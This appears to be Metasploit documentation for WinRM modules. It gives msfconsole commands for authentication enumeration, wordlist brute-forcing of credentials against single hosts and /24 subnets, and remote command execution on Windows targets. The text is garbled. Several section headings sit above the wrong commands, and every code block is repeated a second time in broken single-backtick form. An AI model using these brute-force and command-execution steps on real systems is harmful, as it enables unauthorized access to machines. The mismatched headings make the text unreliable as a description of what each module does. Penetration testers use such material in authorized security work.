## WinRM Workflows
Either with the modern inline option support:
```
use scanner/winrm/winrm_auth_methods

run http://192.168.123.139:5985
run https://192.168.123.139:5986
```

Or by manually setting options:
```
use scanner/winrm/winrm_auth_methods
set RHOST 192.168.123.139
set RPORT 5985
set SSL false
run
```

There are more modules than listed here, for the full list of modules run the `search` command within msfconsole:
```msf
msf6 > search winrm
```

### Lab Environment
WinRM over HTTPS requires the creation of a Server Authenticating Certificate, as well as enabling the transport mode:
```
use scanner/winrm/winrm_auth_methods
run http://192.168.123.139:5985
run https://192.168.123.139:5986
```

### Authentication Enumeration
Enumerate WinRm authentication mechanisms:
```msf
msf6 auxiliary(scanner/winrm/winrm_auth_methods) > run http://192.168.123.139:5985

[+] 192.168.123.139:5985: Negotiate protocol supported
[+] 192.168.123.139:5985: Kerberos protocol supported
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Example:
```
use scanner/winrm/winrm_login
run https://known_user@192.168.222.1:5986 threads=50 pass_file=./wordlist.txt
```

### WinRM Bruteforce
Brute-force host with known user and password list:
```
use scanner/winrm/winrm_login
run http://192.168.123.139:5985 threads=50 user_file=./users.txt pass_file=./wordlist.txt
```

Brute-force credentials:
```
use scanner/winrm/winrm_login
run cidr:/24:http://user:pass@192.168.222.0:5985 threads=50
run cidr:/24:http://user@192.168.222.0:5985 threads=50 pass_file=./wordlist.txt
```

Brute-force credentials in a subnet:
```
use scanner/winrm/winrm_cmd
run http://user:pass@192.168.123.139:5985 cmd='whoami; ipconfig; systeminfo'
```

### WinRM CMD
To execute arbitrary commands against a windows target:
```
use scanner/winrm/winrm_login
run http://user:pass@192.168.123.139:5985
```

`
use scanner/winrm/winrm_auth_methods

run http://192.168.123.139:5985
run https://192.168.123.139:5986
`

`
use scanner/winrm/winrm_auth_methods
set RHOST 192.168.123.139
set RPORT 5985
set SSL false
run
`

`msf
msf6 > search winrm
`

`
use scanner/winrm/winrm_auth_methods
run http://192.168.123.139:5985
run https://192.168.123.139:5986
`

`msf
msf6 auxiliary(scanner/winrm/winrm_auth_methods) > run http://192.168.123.139:5985

[+] 192.168.123.139:5985: Negotiate protocol supported
[+] 192.168.123.139:5985: Kerberos protocol supported
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
`

`
use scanner/winrm/winrm_login
run https://known_user@192.168.222.1:5986 threads=50 pass_file=./wordlist.txt
`

`
use scanner/winrm/winrm_login
run http://192.168.123.139:5985 threads=50 user_file=./users.txt pass_file=./wordlist.txt
`

`
use scanner/winrm/winrm_login
run cidr:/24:http://user:pass@192.168.222.0:5985 threads=50
run cidr:/24:http://user@192.168.222.0:5985 threads=50 pass_file=./wordlist.txt
`

`
use scanner/winrm/winrm_cmd
run http://user:pass@192.168.123.139:5985 cmd='whoami; ipconfig; systeminfo'
`

`
use scanner/winrm/winrm_login
run http://user:pass@192.168.123.139:5985
`

